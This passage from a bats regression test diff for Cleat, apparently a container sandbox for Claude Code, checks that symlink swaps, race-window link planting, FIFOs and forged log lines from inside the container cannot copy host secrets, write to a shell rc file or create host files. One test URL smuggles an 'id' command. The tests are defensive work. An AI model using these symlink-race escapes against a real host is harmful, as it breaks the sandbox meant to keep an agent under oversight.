+  local proj="$TEST_TEMP/proj" target="$TEST_TEMP/host-new-file"
+  mkdir -p "$proj"
+  ln -s "$target" "$proj/.cleat"
+  run _generate_project_cleat "$proj" 4g 2 git
+  assert_failure
+  [ ! -e "$target" ] || { echo "created: $(cat "$target")"; return 1; }
+  [ -L "$proj/.cleat" ] || { echo ".cleat is no longer the link"; return 1; }
+}
+
+# Same shape in the .cleat.env scaffold: `[[ -f ]] && return`, then `cat >`
+# through a dangling link.
+@test "regression v1.5.4: the .cleat.env scaffold never creates the file a dangling link names" {
+  local proj="$TEST_TEMP/proj" target="$TEST_TEMP/host-env-target"
+  mkdir -p "$proj"
+  ln -s "$target" "$proj/.cleat.env"
+  run _scaffold_cleat_env "$proj"
+  assert_success
+  assert_output --partial "Not creating"
+  [ ! -e "$target" ] || { echo "created: $(cat "$target")"; return 1; }
+  [ -L "$proj/.cleat.env" ] || { echo ".cleat.env is no longer the link"; return 1; }
+}
+
+# `mv -f tmp .cleat` moves INTO a directory a link at .cleat names, so a box
+# swapping one in after the checks had the new file dropped in any host
+# directory. The move names the workspace directory instead, which renames onto
+# the final name and never follows a link there. The swap runs at the stage's
+# mktemp, the last step before the rename.
+@test "regression v1.5.4: the rename lands on .cleat even when a link to a host directory is swapped in" {
+  local proj="$TEST_TEMP/proj"
+  _R154_HOSTDIR="$TEST_TEMP/host-dir"
+  _R154_FLAG="$TEST_TEMP/swapped"
+  _R154_CLEAT="$proj/.cleat"
+  mkdir -p "$proj" "$_R154_HOSTDIR"
+  printf '[caps]\ngit\n' > "$proj/.cleat"
+  mktemp() {
+    if [[ "$1" == "-d" && ! -e "$_R154_FLAG" ]]; then
+      : > "$_R154_FLAG"
+      command rm -f "$_R154_CLEAT"
+      command ln -s "$_R154_HOSTDIR" "$_R154_CLEAT"
+    fi
+    command mktemp "$@"
+  }
+  run _write_caps_to_file "$proj/.cleat" ssh
+  unset -f mktemp
+  assert_success
+  [ -e "$_R154_FLAG" ] || { echo "the swap never ran"; return 1; }
+  run ls -A "$_R154_HOSTDIR"
+  assert_output ""
+  [ ! -L "$proj/.cleat" ] || { echo ".cleat is still the link"; return 1; }
+  run cat "$proj/.cleat"
+  assert_output --partial "ssh"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the project settings overlays were built with `[[ -f ]]` and a plain
+# cp, jq or grep, and all of them follow a link. The workspace is the box's to
+# write, so a link at .claude/settings.json, .claude/settings.local.json or
+# .claude itself had the host copy any file the user can read into an overlay
+# mounted into the box. No cap was needed: a cloned repo shipping the link was
+# enough. Every arm fell back to a verbatim copy for a non-JSON target.
+# ─────────────────────────────────────────────────────────────────────────────
+@test "regression v1.5.4: a project settings file linked out of the workspace is never copied into the box" {
+  mock_docker_images "cleat"
+  : > "$CLEAT_GLOBAL_CONFIG"
+  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside"
+  printf 'FAKE-HOST-SECRET\n' > "$TEST_TEMP/outside/id_rsa"
+  ln -s "$TEST_TEMP/outside/id_rsa" "$TEST_TEMP/project/.claude/settings.json"
+  printf '{"permissions":{"allow":["Read"]}}\n' > "$TEST_TEMP/project/.claude/settings.local.json"
+  local cname
+  cname="$(container_name_for "$TEST_TEMP/project")"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  assert_output --regexp 'settings\.json[^ ]{0,8} is a link or unreadable, so Cleat did not read it\.'
+  refute_output --regexp 'settings\.local\.json[^ ]{0,8} is a link'
+  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
+  assert_success
+  run assert_docker_run_has "$cname" "/workspace/.claude/settings.local.json"
+  assert_success
+  run grep -rl FAKE-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
+  assert_failure
+  run cat "$CLEAT_RUN_DIR/$cname/settings/project-settings.local.json"
+  assert_output --partial '"Read"'
+  run find "$CLEAT_RUN_DIR/$cname/settings" -name '.in.*'
+  assert_output ""
+}
+
+@test "regression v1.5.4: a linked .claude directory is never read for project settings" {
+  mock_docker_images "cleat"
+  : > "$CLEAT_GLOBAL_CONFIG"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/hostclaude"
+  # Valid JSON with no hooks: the plain copy arm.
+  printf '{"env":{"TOKEN":"FAKE-HOST-SECRET"}}\n' > "$TEST_TEMP/hostclaude/settings.json"
+  ln -s "$TEST_TEMP/hostclaude" "$TEST_TEMP/project/.claude"
+  local cname
+  cname="$(container_name_for "$TEST_TEMP/project")"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  assert_output --partial "is a link or unreadable, so Cleat did not read it."
+  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
+  assert_success
+  run grep -rl FAKE-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
+  assert_failure
+}
+
+# The file passes the -f and -L checks. The box swaps in a link before the
+# open. The time bound's argv builder runs in that gap.
+@test "regression v1.5.4: a project settings file swapped for a link before its open is not copied" {
+  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside" "$TEST_TEMP/snaps"
+  printf 'FAKE-HOST-SECRET\n' > "$TEST_TEMP/outside/id_rsa"
+  printf '{"model":"opus"}\n' > "$TEST_TEMP/project/.claude/settings.json"
+  _R154_SWAP_F="$TEST_TEMP/project/.claude/settings.json"
+  _R154_SWAP_T="$TEST_TEMP/outside/id_rsa"
+  eval "_r154_real_bounded_argv() $(declare -f _bounded_argv | sed 1d)"
+  _bounded_argv() { rm -f "$_R154_SWAP_F"; ln -s "$_R154_SWAP_T" "$_R154_SWAP_F"; _r154_real_bounded_argv "$@"; }
+  _project_settings_snapshot "$TEST_TEMP/project" settings.json "$TEST_TEMP/snaps/s" || true
+  [ -L "$_R154_SWAP_F" ] || { echo "the swap never ran"; return 1; }
+  run grep -rl FAKE-HOST-SECRET "$TEST_TEMP/snaps"
+  assert_failure
+}
+
+@test "regression v1.5.4: the hooks refresh writes empty settings for a linked project file, never its target" {
+  command -v jq >/dev/null 2>&1 || skip "the refresh needs jq on the host"
+  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside"
+  printf 'PLANTED-HOST-SECRET\n' > "$TEST_TEMP/outside/secret"
+  local cname="c2-refresh-link" dir
+  dir="$CLEAT_RUN_DIR/$cname/settings"
+  mkdir -p "$dir"
+  # As a mounted overlay would be: the box plants the link beside it.
+  printf '{}\n' > "$dir/settings.json"
+  printf '{"old":1}\n' > "$dir/project-settings.json"
+  ln -s "$TEST_TEMP/outside/secret" "$TEST_TEMP/project/.claude/settings.json"
+  ACTIVE_CAPS=(hooks)
+  run _refresh_settings_overlays "$cname" "$TEST_TEMP/project"
+  run cat "$dir/project-settings.json"
+  assert_output "{}"
+  run grep -rl PLANTED-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
+  assert_failure
+}
+
+# cmd_run builds a fork box's overlays from its own copy since v1.4.0, but the
+# refresh at every start, resume and `cleat claude` still read the live tree.
+@test "regression v1.5.4: a fork box's settings refresh reads its own copy, not the origin tree" {
+  command -v jq >/dev/null 2>&1 || skip "the refresh needs jq on the host"
+  local cname="c2-refresh-fork" dir fork
+  dir="$CLEAT_RUN_DIR/$cname/settings"
+  mkdir -p "$dir" "$TEST_TEMP/project/.claude"
+  printf '{}\n' > "$dir/settings.json"
+  printf '{"old":1}\n' > "$dir/project-settings.json"
+  _fork_mark "$cname"
+  fork="$(_fork_dir "$cname")"
+  mkdir -p "$fork/.claude"
+  printf '{"permissions":{"allow":["FORK"]}}\n' > "$fork/.claude/settings.json"
+  printf '{"permissions":{"allow":["LIVE"]}}\n' > "$TEST_TEMP/project/.claude/settings.json"
+  ACTIVE_CAPS=(hooks)
+  run _refresh_settings_overlays "$cname" "$TEST_TEMP/project"
+  run jq -r '.permissions.allow[0]' "$dir/project-settings.json"
+  assert_output "FORK"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the per-project input history was bind-mounted from
+# ~/.claude/projects/<key>/history.jsonl, a name inside the session dir that
+# every box of the project mounts read-write. The box could swap it for a
+# relative link (from there ../../../ is $HOME, no host path needed), and the
+# next recreate or start followed it: cmd_run's bare touch re-stamped the file
+# the link named or created the file a dangling one named, and the bind then
+# mounted that host file read-write into the box. The store is host-only now,
+# and a box created before the move is recreated once on its next start or
+# resume, because only a recreate changes a recorded bind source.
+# ─────────────────────────────────────────────────────────────────────────────
+_h154_fixture() {
+  mock_docker_images "cleat"
+  mkdir -p "$TEST_TEMP/project"
+  H154_CN="$(container_name_for "$TEST_TEMP/project")"
+  H154_KEY="$(_derive_project_session_key "$TEST_TEMP/project")"
+  H154_S="$HOME/.claude/projects/$H154_KEY"
+  H154_STORE="$CLEAT_HISTORY_DIR/$H154_KEY/history.jsonl"
+  mkdir -p "$H154_S"
+}
+
+# A stopped box created before the store: its recorded history source is the
+# name inside its recorded session-dir source.
+_h154_legacy_box() {
+  _h154_fixture
+  export DOCKER_STUB_STRICT=1
+  mkdir -p "$CLEAT_RUN_DIR/$H154_CN/settings"
+  echo '{}' > "$CLEAT_RUN_DIR/$H154_CN/settings/settings.json"
+  printf '{"display":"old-line"}\n' > "$H154_S/history.jsonl"
+  is_running() { return 1; }
+  mock_docker_ps_a "$H154_CN"
+  mock_docker_inspect "$(printf 'H%s\nS%s\n' "$H154_S/history.jsonl" "$H154_S")"
+}
+
+# The H and S inspect lines for the box the last recorded `docker run` of $1
+# created, so a restart is judged on the mounts cmd_run really passed.
+_h154_inspect_from_run() {
+  local line tok prev="" src rest dst out=""
+  line="$(grep "^docker run " "$DOCKER_CALLS" | grep -- "$1" | tail -1)"
+  set -f
+  for tok in $line; do
+    if [ "$prev" = "-v" ]; then
+      src="${tok%%:*}"
+      rest="${tok#*:}"
+      dst="${rest%%:*}"
+      case "$dst" in
+        /home/coder/.claude/history.jsonl) out="${out}H${src}"$'\n' ;;
+        /home/coder/.claude/projects/-workspace) out="${out}S${src}"$'\n' ;;
+      esac
+    fi
+    prev="$tok"
+  done
+  set +f
+  printf '%s' "$out"
+}
+
+@test "regression v1.5.4: the history bind source is host-only, not in the session dir" {
+  _h154_fixture
+  export DOCKER_STUB_STRICT=1
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
+  assert_success
+  run assert_docker_run_lacks "$H154_CN" "$H154_S/history.jsonl:"
+  assert_success
+  [ -f "$H154_STORE" ] && [ ! -L "$H154_STORE" ] || { echo "the store is not a regular file"; return 1; }
+  [ ! -e "$H154_S/history.jsonl" ] || { echo "cmd_run wrote a history file in the session dir"; return 1; }
+}
+
+@test "regression v1.5.4: a history link planted in the session dir is never followed" {
+  _h154_fixture
+  printf 'SECRET\n' > "$HOME/secret"
+  touch -t 200001010000 "$HOME/secret"
+  local before
+  before="$(_path_mtime "$HOME/secret")"
+  ln -s ../../../secret "$H154_S/history.jsonl"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  run cat "$HOME/secret"
+  assert_output "SECRET"
+  run _path_mtime "$HOME/secret"
+  assert_output "$before"
+  [ -f "$H154_STORE" ] && [ ! -L "$H154_STORE" ] || { echo "the store is not a regular file"; return 1; }
+  run grep -c SECRET "$H154_STORE"
+  assert_output "0"
+  [ ! -e "$H154_S/history.jsonl" ] && [ ! -L "$H154_S/history.jsonl" ] \
+    || { echo "the planted link is still in the session dir"; return 1; }
+}
+
+@test "regression v1.5.4: a dangling history link in the session dir creates no host file" {
+  _h154_fixture
+  ln -s ../../../created-by-cleat "$H154_S/history.jsonl"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  [ ! -e "$HOME/created-by-cleat" ] || { echo "cmd_run created the file the link named"; return 1; }
+  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
+  assert_success
+}
+
+@test "regression v1.5.4: cmd_start recreates a box whose history bind is in its session dir" {
+  _h154_legacy_box
+  run cmd_start "$TEST_TEMP/project"
+  assert_success
+  assert_output --partial "Recreating container"
+  assert_output --partial "host paths changed"
+  run docker_calls
+  assert_output --partial "docker rm -f $H154_CN"
+  refute_output --partial "docker start $H154_CN"
+  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
+  assert_success
+  # The recreate carried the box's history over, and left no name behind.
+  run cat "$H154_STORE"
+  assert_output '{"display":"old-line"}'
+  [ ! -e "$H154_S/history.jsonl" ] || { echo "the old history file is still in the session dir"; return 1; }
+}
+
+@test "regression v1.5.4: cmd_resume recreates a box whose history bind is in its session dir" {
+  _h154_legacy_box
+  run cmd_resume "$TEST_TEMP/project"
+  assert_success
+  assert_output --partial "Recreating container"
+  assert_output --partial "host paths changed"
+  run docker_calls
+  assert_output --partial "docker rm -f $H154_CN"
+  refute_output --partial "docker start $H154_CN"
+  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
+  assert_success
+  run cat "$H154_STORE"
+  assert_output '{"display":"old-line"}'
+}
+
+# The recreate must happen once. The second start is judged on the mounts the
+# first one's cmd_run really recorded, through both verbs.
+@test "regression v1.5.4: a box on the host-only history store restarts without a recreate" {
+  _h154_legacy_box
+  run cmd_start "$TEST_TEMP/project"
+  assert_output --partial "Recreating container"
+  run _h154_inspect_from_run "$H154_CN"
+  assert_line "H$H154_STORE"
+  assert_line "S$H154_S"
+  mock_docker_inspect "$(_h154_inspect_from_run "$H154_CN")"
+  : > "$DOCKER_CALLS"
+  run cmd_start "$TEST_TEMP/project"
+  assert_success
+  refute_output --partial "Recreating"
+  run docker_calls
+  assert_output --partial "docker start $H154_CN"
+  refute_output --partial "docker rm -f $H154_CN"
+  : > "$DOCKER_CALLS"
+  run cmd_resume "$TEST_TEMP/project"
+  assert_success
+  refute_output --partial "Recreating"
+  run docker_calls
+  assert_output --partial "docker start $H154_CN"
+  refute_output --partial "docker rm -f $H154_CN"
+}
+
+# ~/.claude/history.jsonl is the nested bind TARGET, pre-created for VirtioFS.
+# `touch` on it followed a link there, like the source's touch did.
+@test "regression v1.5.4: the nested history target is never touched through a link" {
+  _h154_fixture
+  printf 'SECRET\n' > "$HOME/secret"
+  touch -t 200001010000 "$HOME/secret"
+  local before
+  before="$(_path_mtime "$HOME/secret")"
+  ln -s ../secret "$HOME/.claude/history.jsonl"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  run _path_mtime "$HOME/secret"
+  assert_output "$before"
+  _container_has_kit_mounts() { return 1; }
+  run _ensure_host_mount_targets "$H154_CN"
+  assert_success
+  run _path_mtime "$HOME/secret"
+  assert_output "$before"
+  run cat "$HOME/secret"
+  assert_output "SECRET"
+  # A dangling link there never becomes a new host file.
+  rm -f "$HOME/.claude/history.jsonl"
+  ln -s ../made-by-cleat "$HOME/.claude/history.jsonl"
+  run _ensure_host_mount_targets "$H154_CN"
+  [ ! -e "$HOME/made-by-cleat" ] || { echo "the start created the file the link named"; return 1; }
+  # With nothing there, both paths still create the target VirtioFS needs.
+  rm -f "$HOME/.claude/history.jsonl"
+  run _ensure_host_mount_targets "$H154_CN"
+  [ -f "$HOME/.claude/history.jsonl" ] && [ ! -L "$HOME/.claude/history.jsonl" ] \
+    || { echo "the start did not create the target"; return 1; }
+  rm -f "$HOME/.claude/history.jsonl"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  [ -f "$HOME/.claude/history.jsonl" ] && [ ! -L "$HOME/.claude/history.jsonl" ] \
+    || { echo "cmd_run did not create the target"; return 1; }
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the browser bridge's log lived in the clip dir, which the box mounts
+# read-write, and every write to it followed a link: the watcher's `>>`, the
+# callback proxy's own log lines, socat's `2>>` and python's open(). v1.5.0
+# re-checked the path once per claimed URL, but a box that renames a fresh
+# link over it in a loop wins any gap a check leaves, so URL lines of its
+# choosing still landed in any host file the user can write, a shell rc file
+# included. The log and the callback proxy's readiness marker now live in
+# bridge/, a sibling of the clip dir that no mount contains.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Wait for a basic regex to appear in a file. $1 = file, $2 = pattern.
+_v154_bw_wait_for() {
+  local i=0
+  while [ "$i" -lt 20 ]; do
+    grep -q "$2" "$1" 2>/dev/null && return 0
+    sleep 0.2
+    i=$((i + 1))
+  done
+  return 1
+}
+
+@test "regression v1.5.4: a proxy log link the box keeps re-planting never receives a line from the watcher or the callback proxy" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  # Hardcoded rather than read from the helper, so a mutated helper cannot
+  # redirect this test's own read.
+  local log="$TEST_TEMP/bridge/proxy-log"
+  printf 'echo original\n' > "$TEST_TEMP/fake-rc"
+  _extract_callback_port() { echo "1455"; return 0; }
+  _port_in_use() { return 1; }
+  # The proxy child writes to the log itself, after the readiness wait, which
+  # is the window the per-claim check never covered.
+  _auth_callback_proxy() {
+    echo "[proxy x] starting" >> "$3"
+    : > "$4"
+    sleep 2
+    echo "[proxy x] exited" >> "$3"
+  }
+  _browser_watcher "$dir" "true" "mybox" "auto" "1" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  ( while :; do
+      ln -sf "$TEST_TEMP/fake-rc" "$dir/.pl.tmp" 2>/dev/null
+      mv -f "$dir/.pl.tmp" "$dir/.proxy-log" 2>/dev/null
+      sleep 0.05
+    done ) &
+  local lpid=$!
+
+  # The waits never fail the test on their own: the host file is the property,
+  # so it is checked first even when the lines went somewhere else.
+  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
+  _v154_bw_wait_for "$log" "opening URL" || true
+  printf '%s' "https://auth.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback;id;#" > "$dir/.browser-open"
+  _v154_bw_wait_for "$log" "$_BROWSER_BLOCKED_MARK origin=auth.example.com" || true
+  printf '%s' "https://docs.python.org/3/library/" > "$dir/.browser-open"
+  _v154_bw_wait_for "$log" "deferring URL" || true
+  _v154_bw_wait_for "$log" "proxy x. exited" || true
+
+  kill "$lpid" 2>/dev/null || true; wait "$lpid" 2>/dev/null || true
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+
+  run cat "$TEST_TEMP/fake-rc"
+  assert_output "echo original"
+  run cat "$log"
+  assert_output --partial "extracted callback port=1455"
+  assert_output --partial "opening URL on host"
+  assert_output --partial "$_BROWSER_BLOCKED_MARK origin=auth.example.com"
+  assert_output --partial "deferring URL to terminal"
+  assert_output --partial "[proxy x] starting"
+  assert_output --partial "[proxy x] exited"
+}
+
+@test "regression v1.5.4: with no state dir outside the mount a faked readiness marker never starts the proxy or opens the browser" {
+  # A regular file where the bridge state dir would go, so it cannot be made.
+  # The readiness marker is then refused, never put in the clip dir, where the
+  # box could create it (an open with no listener) or point it at a host file.
+  # The claim dir stays usable. Without it the whole browser bridge is off (see
+  # the claim dir regression further down) and this path is never reached.
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  : > "$TEST_TEMP/bridge"
+  cat > "$TEST_TEMP/fake_open" <<OPEN
+#!/usr/bin/env bash
+echo "\$1" >> "$TEST_TEMP/opened.log"
+OPEN
+  chmod +x "$TEST_TEMP/fake_open"
+  _extract_callback_port() { echo "1455"; return 0; }
+  _port_in_use() { return 1; }
+  # Never writes the marker: only the box's fake could make it appear.
+  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; sleep 5; }
+  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  # The watcher's $$ is this shell's $$, so this is the name it would poll.
+  ( while :; do : > "$dir/.proxy-ready.$$" 2>/dev/null; sleep 0.05; done ) &
+  local lpid=$!
+  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
+  sleep 3
+  kill "$lpid" 2>/dev/null || true; wait "$lpid" 2>/dev/null || true
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+
+  [ ! -e "$TEST_TEMP/proxy_started" ] || {
+    echo "REGRESSION: the callback proxy started with its marker inside the mount"; return 1; }
+  [ ! -e "$TEST_TEMP/opened.log" ] || {
+    echo "REGRESSION: a readiness marker the box faked opened the browser"; return 1; }
+}
+
+@test "regression v1.5.4: a refusal line the box writes into its clip dir is never reported at session end" {
+  # The report reads the host-only log. A line the box forges in its own clip
+  # dir, where the log used to be, must never reach the terminal.
+  _host_open_cmd() { echo ""; }
+  mkdir -p "$CLEAT_RUN_DIR/test-ctr/clip" "$CLEAT_RUN_DIR/test-ctr/bridge"
+  docker() {
+    if [ "${1:-}" = exec ] && [ "${2:-}" = -it ]; then
+      printf '[browser-watcher 10:00:00] %s origin=evil.example url=https://evil.example/oauth/authorize?redirect_uri=x\n' \
+        "$_BROWSER_BLOCKED_MARK" >> "$CLEAT_RUN_DIR/test-ctr/clip/.proxy-log"
+      printf '[browser-watcher 10:00:00] %s origin=auth.example.com url=https://auth.example.com/oauth/authorize?redirect_uri=x\n' \
+        "$_BROWSER_BLOCKED_MARK" >> "$CLEAT_RUN_DIR/test-ctr/bridge/proxy-log"
+    fi
+    command docker "$@"
+  }
+  run exec_claude "test-ctr" --dangerously-skip-permissions
+  assert_success
+  assert_output --partial "cleat browser allow auth.example.com"
+  refute_output --partial "evil.example"
+}
+
+# ── v1.5.4: the watcher log leaves the mount, and its cap rotates by rename ──
+#
+# The watcher log lived at clip/.watcher-log, inside the clip dir the box has
+# read-write. The cap dropped a link once, then `[ -f ]`, `wc -c <` and `: >`
+# each looked the name up again, so a link swapped in after the drop had the cap
+# empty any host file over 1 MB. And every watcher spawn opened the name again
+# for `>>` with no check at all, so a link planted after the cap sent watcher
+# output into a host file the box chose, created if missing. The log now lives
+# at logs/watcher.log beside clip/, never mounted, and the cap sizes by stat and
+# rotates an oversized log by rename into a host-only dir.
+
+# Swaps the log for another shape right after the real pre-filter, which is the
+# window the box had. $_WL_SWAP names the shape: a link to $_WL_VICTIM or a FIFO.
+_wl_swap_after_drop() {
+  eval "_wl_real_drop_unless_regular() $(declare -f _drop_unless_regular | sed 1d)"
+  _drop_unless_regular() {
+    _wl_real_drop_unless_regular "$@"
+    rm -f "$1"
+    case "$_WL_SWAP" in
+      link) ln -s "$_WL_VICTIM" "$1" ;;
+      fifo) mkfifo "$1" ;;
+    esac
+  }
+}
+
+@test "regression v1.5.4: capping a watcher log never truncates through a link swapped in after the check" {
+  local clip="$TEST_TEMP/wl/clip" claim="$TEST_TEMP/wl/clipclaim"
+  mkdir -p "$clip"
+  head -c 1200000 /dev/zero | tr '\0' 'x' > "$clip/.proxy-log"
+  _WL_VICTIM="$TEST_TEMP/wl-victim"
+  head -c 1200000 /dev/zero | tr '\0' 'v' > "$_WL_VICTIM"
+  _WL_SWAP=link
+  _wl_swap_after_drop
+  run _cap_watcher_log "$clip/.proxy-log" "$claim"
+  assert_success
+  assert_output "0"
+  local sz; sz="$(wc -c < "$_WL_VICTIM" | tr -d '[:space:]')"
+  [ "$sz" -eq 1200000 ] || fail "the cap emptied the file a swapped-in link named: $sz bytes left"
+  # The link itself was moved away and deleted, never written through.
+  run test -L "$clip/.proxy-log"
+  assert_failure
+  run ls -A "$claim"
+  assert_output ""
+}
+
+@test "regression v1.5.4: a FIFO swapped in after the check never blocks the watcher log cap" {
+  local clip="$TEST_TEMP/wl/clip" out="$TEST_TEMP/wl-out" pid i=0
+  mkdir -p "$clip"
+  echo "prior" > "$clip/.watcher-log"
+  _WL_SWAP=fifo
+  _wl_swap_after_drop
+  ( _cap_watcher_log "$clip/.watcher-log" "$TEST_TEMP/wl/claim" > "$out" 2>/dev/null ) 3>&- &
+  pid=$!
+  while [ "$i" -lt 50 ] && kill -0 "$pid" 2>/dev/null; do
+    sleep 0.1
+    i=$(( i + 1 ))
+  done
+  if kill -0 "$pid" 2>/dev/null; then
+    # Release the blocked reader so the test process is not left hanging.
+    _portable_timeout 5 bash -c ': > "$1"' _ "$clip/.watcher-log" || true
+    wait "$pid" 2>/dev/null || true
+    fail "the cap blocked on a FIFO swapped in after its pre-filter"
+  fi
+  wait "$pid" 2>/dev/null || true
+  run cat "$out"
+  assert_output "0"
+}
+
+# The spawn half. After the cap has run, the box plants a link at the old
+# in-mount log name, and the session's interactive exec waits until one of the
+# two possible logs exists, so every watcher's `>>` has opened before the
+# session ends. Shared by the exec_claude, cmd_shell and cmd_login tests.
+_wl_cap_then_plant() {
+  _wl_real_cap_watcher_log "$@"
+  rm -f "$_WL_CLIP/.watcher-log"
+  ln -s "$_WL_VICTIM" "$_WL_CLIP/.watcher-log"
+}
+_wl_session_exec_waits() {
+  local i=0
+  if [ "${1:-}" = exec ] && [ "${2:-}" = -it ]; then
+    while [ "$i" -lt 50 ] && [ ! -e "$_WL_VICTIM" ] && [ ! -e "$_WL_HOSTLOG" ]; do
+      sleep 0.1
+      i=$(( i + 1 ))
+    done
+  fi
+  command docker "$@"
+}
+_wl_arm_spawn_link() {
+  eval "_wl_real_cap_watcher_log() $(declare -f _cap_watcher_log | sed 1d)"
+  _cap_watcher_log() { _wl_cap_then_plant "$@"; }
+  docker() { _wl_session_exec_waits "$@"; }
+}
+
+@test "regression v1.5.4: session watchers never append through a link in the clip dir" {
+  local cname="wl-spawn-ctr"
+  local rd="$HOME/.config/cleat/run/${cname}"
+  mkdir -p "$rd/clip"
+  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
+  cat > "$TEST_TEMP/wl_spawner.sh" <<EOF
+source "$TEST_TEMP/cli_stripped"
+_WL_CLIP="$rd/clip"
+_WL_VICTIM="$TEST_TEMP/host-victim"
+_WL_HOSTLOG="$rd/logs/watcher.log"
+$(declare -f _wl_cap_then_plant _wl_session_exec_waits _wl_arm_spawn_link)
+_wl_arm_spawn_link
+# The clipboard watcher only: no opener, so no browser watcher.
+_host_clip_cmd() { echo "true"; }
+_host_open_cmd() { echo ""; }
+exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>&1
+EOF
+  _portable_timeout 15 bash "$TEST_TEMP/wl_spawner.sh" || true
+  run test -e "$TEST_TEMP/host-victim"
+  assert_failure
+  run test -f "$rd/logs/watcher.log"
+  assert_success
+}
+
+@test "regression v1.5.4: cleat shell never appends watcher output through a link in the clip dir" {
+  mkdir -p "$TEST_TEMP/project"
+  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
+  mock_docker_ps "$cname"
+  _host_open_cmd() { echo "true"; }
+  _WL_CLIP="$CLEAT_RUN_DIR/$cname/clip"
+  _WL_VICTIM="$TEST_TEMP/host-victim"
+  _WL_HOSTLOG="$CLEAT_RUN_DIR/$cname/logs/watcher.log"
+  mkdir -p "$_WL_CLIP"
+  _wl_arm_spawn_link
+  run cmd_shell "$TEST_TEMP/project"
+  assert_success
+  run test -e "$_WL_VICTIM"
+  assert_failure
+  run test -f "$_WL_HOSTLOG"
+  assert_success
+}
+
+@test "regression v1.5.4: cleat login never appends watcher output through a link in the clip dir" {
+  mkdir -p "$TEST_TEMP/project"
+  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
+  mock_docker_ps "$cname"
+  _host_open_cmd() { echo "true"; }
+  _WL_CLIP="$CLEAT_RUN_DIR/$cname/clip"
+  _WL_VICTIM="$TEST_TEMP/host-victim"
+  _WL_HOSTLOG="$CLEAT_RUN_DIR/$cname/logs/watcher.log"
+  mkdir -p "$_WL_CLIP"
+  _wl_arm_spawn_link
+  run cmd_login "$TEST_TEMP/project"
+  assert_success
+  run test -e "$_WL_VICTIM"
+  assert_failure
+  run test -f "$_WL_HOSTLOG"
+  assert_success
+}
+
+@test "regression v1.5.4: a link planted at a session's watcher marker name is never followed" {
+  # The session touched .watcher.<its pid> in the clip dir, which the box has
+  # read-write. The box could read a live host pid off the markers there and
+  # plant links at the names a later session would use, and touch followed the
+  # link: the host created, or re-stamped, a file of the box's choosing anywhere
+  # the user can write. The marker lives in the host-only clipwatch/ now.
+  _host_clip_cmd() { echo "true"; }
+  _host_open_cmd() { echo ""; }
+  _clipboard_watcher() { :; }
+  export CLEAT_NO_CLIPBOARD_IMAGE=1
+  local clip="$CLEAT_RUN_DIR/test-wm154/clip" out="$TEST_TEMP/wm154-outside"
+  mkdir -p "$clip" "$out"
+  # $$ inside `run exec_claude` is this shell's pid, the exact name the session
+  # writes.
+  ln -s "$out/created" "$clip/.watcher.$$"
+  run exec_claude test-wm154 --dangerously-skip-permissions
+  assert_success
+  run test -e "$out/created"
+  assert_failure
+
+  # An existing file is not re-stamped either.
+  echo old > "$out/old"
+  touch -t 200001010000 "$out/old"
+  ln -sfn "$out/old" "$clip/.watcher.$$"
+  run exec_claude test-wm154 --dangerously-skip-permissions
+  assert_success
+  local m; m="$(_path_mtime "$out/old")"
+  [ "$m" -lt 1000000000 ] || {
+    echo "REGRESSION: the session re-stamped the link's target (mtime $m)"; return 1; }
+}
+
+@test "regression v1.5.4: the host never writes .host-ready, even when a link lands after its check" {
+  # The watcher dropped a link at .host-ready and then ran touch. The box can
+  # rename a fresh link over the name in the gap between the two, and touch
+  # follows it. The gap is made deterministic here: every drop of the sentinel
+  # is followed at once by a new link. Since v1.5.4 the host does not write the
+  # name at all. The box writes it, inside the box.
+  local clip_dir="$TEST_TEMP/clip-hr154" out="$TEST_TEMP/hr154-outside"
+  mkdir -p "$clip_dir" "$out"
+  local target="$out/created"
+  ln -s "$target" "$clip_dir/.host-ready"
+  _HR154_TARGET="$target"
+  _drop_unless_regular() {
+    case "$1" in
